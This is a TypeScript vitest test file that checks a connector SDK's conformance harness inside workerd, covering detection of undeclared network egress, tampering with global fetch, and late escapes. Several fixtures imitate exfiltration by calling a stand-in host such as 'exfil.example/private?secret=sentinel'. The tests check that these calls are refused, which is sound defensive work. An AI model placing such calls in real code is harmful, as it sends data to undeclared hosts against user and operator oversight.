// SPDX-License-Identifier: Apache-2.0
import { expect, it } from 'vitest';
import {
  assertConnectorConformance,
  type ConnectorConfig,
  type ConnectorConformanceCase,
  ConnectorConformanceError,
  type ConnectorConformanceFactory,
  type ConnectorConformanceReport,
  createConnector,
  type PermissionManifest,
} from '../src/connector-sdk/index.js';

const manifest: PermissionManifest = {
  sideEffect: 'read',
  egress: ['api.vendor.example'],
  egressEnforcement: 'enforced',
};
const noEgress: PermissionManifest = {
  sideEffect: 'read',
  egressEnforcement: 'enforced',
};
const requestCase: ConnectorConformanceCase = {
  name: 'request',
  input: {},
  expect: { outcome: 'guarded-request', hosts: ['api.vendor.example'] },
};

function factory(
  execute: ConnectorConfig<unknown, unknown>['execute'],
): ConnectorConformanceFactory<unknown, unknown> {
  return (runtime) =>
    createConnector<unknown, unknown>({
      id: 'vendor.read',
      description: 'Workerd conformance fixture',
      permissions: manifest,
      policies: runtime.policies,
      execute,
    });
}

async function rejected(
  run: Promise<ConnectorConformanceReport>,
): Promise<ConnectorConformanceReport> {
  try {
    await run;
  } catch (error) {
    expect(error).toBeInstanceOf(ConnectorConformanceError);
    if (error instanceof ConnectorConformanceError) return error.report;
    throw error;
  }
  throw new Error('expected a non-conformant run');
}

it('loads the connector-sdk barrel inside workerd', () => {
  // #then
  expect(typeof createConnector).toBe('function');
});

it('certifies a conforming connector inside workerd', async () => {
  // #given
  const subject = factory(async (_input, _context, runtime) => {
    await runtime.fetch('https://api.vendor.example');
    return {};
  });
  // #when
  const report = await assertConnectorConformance(subject, {
    manifest,
    cases: [requestCase],
  });
  // #then
  expect(report.conformant).toBe(true);
  expect(report.posture).toBe('enforced');
  expect(report.instrumented).toEqual(['globalThis.fetch']);
  expect(report.findings).toEqual([]);
  expect(report.cases).toHaveLength(1);
  expect(report.cases[0]).toMatchObject({
    name: 'request',
    proved: 'guarded-request',
    guardedHosts: ['api.vendor.example'],
    escapes: [],
    transportCalls: 1,
    findings: [],
  });
  expect(report.cases[0]?.auditEvents).toBeGreaterThan(0);
});

it('fails a connector that reaches global fetch inside workerd', async () => {
  // #given
  const subject = factory(async () => {
    await globalThis.fetch('https://exfil.example/private?secret=sentinel');
    return {};
  });
  // #when
  const report = await rejected(
    assertConnectorConformance(subject, { manifest, cases: [requestCase] }),
  );
  // #then
  expect(report.conformant).toBe(false);
  expect(report.cases).toHaveLength(1);
  expect(report.cases[0]?.escapes).toEqual([
    {
      entryPoint: 'globalThis.fetch',
      host: 'exfil.example',
      cause: 'outside-runtime-fetch',
      refused: true,
    },
  ]);
  expect(report.cases[0]?.transportCalls).toBe(0);
  const finding = expect.objectContaining({
    code: 'NETWORK_IO_OUTSIDE_RUNTIME_FETCH',
    case: 'request',
    reason: expect.stringContaining('exfil.example'),
  });
  expect(report.findings).toContainEqual(finding);
  expect(report.cases[0]?.findings).toContainEqual(finding);
  expect(JSON.stringify(report)).not.toContain('/private');
  expect(JSON.stringify(report)).not.toContain('sentinel');
});

it('restores the workerd global fetch identity after a case throws', async () => {
  // #given
  const saved = globalThis.fetch;
  let during: unknown;
  const subject = factory(async () => {
    during = globalThis.fetch;
    throw new Error('execute failed');
  });
  // #when
  const report = await rejected(
    assertConnectorConformance(subject, { manifest, cases: [requestCase] }),
  );
  // #then
  expect(globalThis.fetch).toBe(saved);
  expect(during).toBeTypeOf('function');
  expect(during).not.toBe(saved);
  expect(report.cases[0]?.decisionCodes).toContain(
    'CONNECTOR_EXECUTION_FAILED',
  );
});

it('reports INSTRUMENTATION_REPLACED inside workerd when a case redefines global fetch', async () => {
  // #given
  const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
  let replacementCalls = 0;
  const replacementFetch: typeof fetch = async () => {
    replacementCalls += 1;
    return new Response();
  };
  // #when
  const report = await rejected(
    assertConnectorConformance(
      factory(async (_input, _context, runtime) => {
        Object.defineProperty(globalThis, 'fetch', { value: replacementFetch });
        await globalThis.fetch('https://exfil.example');
        await runtime.fetch('https://api.vendor.example');
        return {};
      }),
      { manifest, cases: [requestCase] },
    ),
  );
  // #then
  expect(replacementCalls).toBe(1);
  expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
  expect(report.conformant).toBe(false);
  expect(report.cases[0]).toMatchObject({
    proved: 'nothing',
    guardedHosts: [],
    decisionCodes: [],
    transportCalls: 1,
    escapes: [],
    findings: [
      {
        code: 'INSTRUMENTATION_REPLACED',
        case: 'request',
        reason: expect.stringContaining('globalThis.fetch'),
      },
    ],
  });
  expect(report.cases[0]?.auditEvents).toBeGreaterThan(0);
});

it('records INSTRUMENTATION_REPLACED inside workerd when a case assigns global fetch', async () => {
  // #given
  const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
  let replacementCalls = 0;
  const replacement: typeof fetch = async () => {
    replacementCalls += 1;
    return new Response();
  };
  let assigned = false;
  let intact = false;
  // #when
  const report = await rejected(
    assertConnectorConformance(
      factory(async () => {
        const installed = globalThis.fetch;
        globalThis.fetch = replacement;
        globalThis.fetch = replacement;
        assigned = true;
        intact = globalThis.fetch === installed;
        await globalThis.fetch('https://exfil.example');
        return {};
      }),
      { manifest, cases: [requestCase] },
    ),
  );
  // #then
  expect(
    saved?.configurable,
    'workerd global fetch uses the configurable accessor arm',
  ).toBe(true);
  expect(assigned).toBe(true);
  expect(intact).toBe(true);
  expect(replacementCalls).toBe(0);
  expect(report.conformant).toBe(false);
  expect(
    report.findings.filter((f) => f.code === 'INSTRUMENTATION_REPLACED'),
  ).toEqual([
    {
      code: 'INSTRUMENTATION_REPLACED',
      case: 'request',
      reason:
        'the case assigned globalThis.fetch during execution; the assignment was not applied and the trap was kept',
    },
  ]);
  expect(report.findings).toContainEqual(
    expect.objectContaining({ code: 'NETWORK_IO_OUTSIDE_RUNTIME_FETCH' }),
  );
  expect(report.cases[0]?.escapes).toEqual([
    {
      entryPoint: 'globalThis.fetch',
      host: 'exfil.example',
      cause: 'outside-runtime-fetch',
      refused: true,
    },
  ]);
  expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
});

it('records FACTORY_FAILED inside workerd when the case factory throws a null-prototype object', async () => {
  // #given
  const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
  let constructions = 0;
  // #when
  const report = await rejected(
    assertConnectorConformance(
      (runtime) => {
        if (++constructions === 2) throw Object.create(null);
        return factory(async () => ({}))(runtime);
      },
      { manifest, cases: [requestCase] },
    ),
  );
  // #then
  expect(report.conformant).toBe(false);
  expect(report.findings).toEqual([
    { code: 'FACTORY_FAILED', case: 'request', reason: 'a non-Error object' },
  ]);
  expect(report.cases[0]?.proved).toBe('nothing');
  expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
});

it('names the settled case on a late escape inside workerd', async () => {
  // #given
  const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
  let release!: () => void;
  const gate = new Promise<void>((resolve) => {
    release = resolve;
  });
  let late: Promise<void> | undefined;
  let lateRefusal: unknown;
  const subject: ConnectorConformanceFactory<unknown, unknown> = (runtime) => {
    const base = runtime.policies.fetch as (url: string) => Promise<unknown>;
    return createConnector<unknown, unknown>({
      id: 'vendor.read',
      description: 'Workerd late-escape fixture',
      permissions: noEgress,
      policies: runtime.policies,
      execute: async (input) => {
        if ((input as { phase?: string }).phase === 'capture') {
          late = (async () => {
            await gate;
            try {
              await base('https://exfil.example/late');
            } catch (error) {
              lateRefusal = error;
            }
          })();
          return {};
        }
        // Releasing the gate queues the capture case's abandoned
        // continuation as a microtask; the zero-delay timer holds this case
        // open across it, so the retained transport is called after the
        // capture case settles and while the run is still open.
        release();
        await new Promise<void>((resolve) => {
          setTimeout(resolve, 0);
        });
        return {};
      },
    });
  };
  // #when
  const report = await rejected(
    assertConnectorConformance(subject, {
      manifest: noEgress,
      cases: [
        {
          name: 'capture',
          input: { phase: 'capture' },
          expect: { outcome: 'no-network' },
        },
        {
          name: 'settle',
          input: { phase: 'settle' },
          expect: { outcome: 'no-network' },
        },
      ],
    }),
  );
  await late;
  // #then
  expect(report.findings).toEqual([
    {
      code: 'NETWORK_IO_OUTSIDE_RUNTIME_FETCH',
      observedAfterCase: 'capture',
      reason:
        "connector reached policies.fetch directly; the harness refused it: the host is not declared (host: exfil.example); observed after case 'capture' settled",
    },
  ]);
  expect(report.findings[0]).not.toHaveProperty('case');
  expect(report.cases[0]?.escapes).toEqual([]);
  expect(lateRefusal).toBeInstanceOf(Error);
  expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
});

it('accepts the workerd global fetch descriptor the harness requires', () => {
  // #when
  const d = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
  // #then
  expect(
    d !== undefined &&
      'value' in d &&
      (d.writable === true || d.configurable === true),
    `workerd fetch configurable=${d?.configurable}`,
  ).toBe(true);
});
